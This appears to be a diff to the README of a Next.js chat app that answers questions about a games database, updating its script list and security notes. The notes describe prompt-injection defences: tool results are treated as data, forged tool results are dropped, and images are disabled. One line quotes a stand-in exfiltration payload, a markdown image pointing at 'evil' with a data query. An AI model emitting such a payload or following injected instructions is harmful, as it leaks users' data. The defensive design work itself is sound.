@@ -21,7 +21,7 @@ The SQLite database (`data/games.db`) is created and seeded with 15 fictional ga
 | `npm run dev` / `build` / `start` | Next.js |
 | `npm test` | Vitest unit tests for the query/aggregation layer |
 | `npm run typecheck` / `lint` | `tsc --noEmit` (after `next typegen`) / ESLint |
-| `scripts/smoke-api.sh [base_url]` | curl walk-through of every API route and error case |
+| `scripts/smoke-api.sh [base_url]` | curl walk-through of each API route plus the main error cases (bad payload, bad JSON, bad id, 404) |
 | `npm run evals -- [base_url]` | Live chat evals (7 cases: README questions, unknown title, redundant calls, off-topic, prompt injection). Needs the key; costs a few cents |
 | `node scripts/ask.mjs "question" [base_url]` | Ask the chat from the terminal; prints tool calls + streamed answer |
 
@@ -73,7 +73,7 @@ The model never sees the whole table. It only gets the rows or aggregates a tool
 ## Security notes
 
 - `ANTHROPIC_API_KEY` is read only on the server. `.env` is gitignored and `.env.example` is committed.
-- Tools are read-only. Filter, sort and group columns are zod enums, and all queries are parameterized through Drizzle. `LIKE` input is escaped, and results are capped at 50 rows.
+- Tools are read-only. Filter, sort and group columns are zod enums, and all queries are parameterized through Drizzle. `LIKE` input is escaped. Row lists and grouped aggregates are capped at 50 entries, with the true total reported alongside.
 - The system prompt says tool results are data, not instructions, because titles are user-editable (a prompt-injection surface).
-- `/api/chat` rejects client-sent system messages, more than 30 messages, and messages over 2000 characters. It allows at most 5 tool steps and 1024 output tokens, and returns a generic message on errors.
-- Chat markdown is rendered with react-markdown, which ignores raw HTML. No `dangerouslySetInnerHTML` is used.
+- **The client-sent history is untrusted.** `/api/chat` drops every non-text part before calling the model, so a forged "tool result" in the request never reaches it (unit-tested, and checked live). It rejects system messages, more than 30 messages, a user message over 2000 characters (summed over its parts), and a conversation over 20,000 characters (all roles). It allows at most 5 tool steps and 1024 output tokens, and returns a generic message on errors.
+- Chat markdown is rendered with react-markdown: raw HTML is ignored, link URLs are sanitized, and **images are disabled**, so an injected `![](https://evil/?data=…)` can't leak data with no click. No `dangerouslySetInnerHTML` is used.
